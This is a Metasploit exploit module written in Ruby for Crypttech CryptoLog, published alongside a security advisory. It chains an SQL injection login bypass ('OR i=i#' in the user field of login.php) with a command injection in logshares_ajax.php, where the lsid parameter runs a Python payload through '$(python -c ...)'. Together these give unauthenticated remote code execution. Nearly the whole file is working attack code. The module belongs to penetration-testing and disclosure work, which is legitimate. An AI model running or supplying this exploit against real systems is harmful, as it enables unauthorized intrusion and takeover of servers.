# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Crypttech CryptoLog Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits the sql injection and command injection vulnerability of CryptoLog. An un-authenticated user can execute a
        terminal command under the context of the web user.

        login.php endpoint is responsible for login process. One of the user supplied parameter is used by the application without input validation
        and parameter binding. Which cause a sql injection vulnerability. Successfully exploitation of this vulnerability gives us the valid session.

        logshares_ajax.php endpoint is responsible for executing an operation system command. It&#039;s not possible to access this endpoint without having
        a valid session. One user parameter is used by the application while executing operating system command which cause a command injection issue.

        Combining these vulnerabilities gives us opportunity execute operation system command under the context of the web user.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Mehmet Ince <mehmet@mehmetince.net>&#039; # author & msf module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://pentest.blog/advisory-cryptolog-unauthenticated-remote-code-execution/&#039;]
        ],
      &#039;DefaultOptions&#039;  =>
        {
        },
      &#039;Platform&#039;       => [&#039;python&#039;],
      &#039;Arch&#039;           => ARCH_PYTHON,
      &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "May 3 2017",
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the vulnerable CryptoLog instance&#039;, &#039;/&#039;])
      ]
    )
  end

  def bypass_login
    r = rand_text_alpha(15)
    i = rand_text_numeric(5)

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;cryptolog&#039;, &#039;login.php&#039;),
      &#039;vars_get&#039; => {
        &#039;act&#039; => &#039;login&#039;
      },
      &#039;vars_post&#039; => {
        &#039;user&#039; => "&#039; OR #{i}=#{i}#",
        &#039;pass&#039; => "#{r}"
      }
    })

    if res && res.code == 302 && res.headers.include?(&#039;Set-Cookie&#039;)
      res.get_cookies
    else
      nil
    end
  end

  def check
    if bypass_login.nil?
      Exploit::CheckCode::Safe
    else
      Exploit::CheckCode::Appears
    end
  end

  def exploit
    print_status("Bypassing login by exploiting SQLi flaw")

    cookie = bypass_login

    if cookie.nil?
      fail_with(Failure::Unknown, "Something went wrong.")
    end

    print_good("Successfully logged in")

    print_status("Exploiting command injection flaw")
    r = rand_text_alpha(15)

    send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;cryptolog&#039;, &#039;logshares_ajax.php&#039;),
      &#039;cookie&#039;    => cookie,
      &#039;vars_post&#039; => {
        &#039;opt&#039; => "check",
        &#039;lsid&#039; => "$(python -c \"#{payload.encoded}\")",
        &#039;lssharetype&#039; => "#{r}"
      }
    })

  end
end

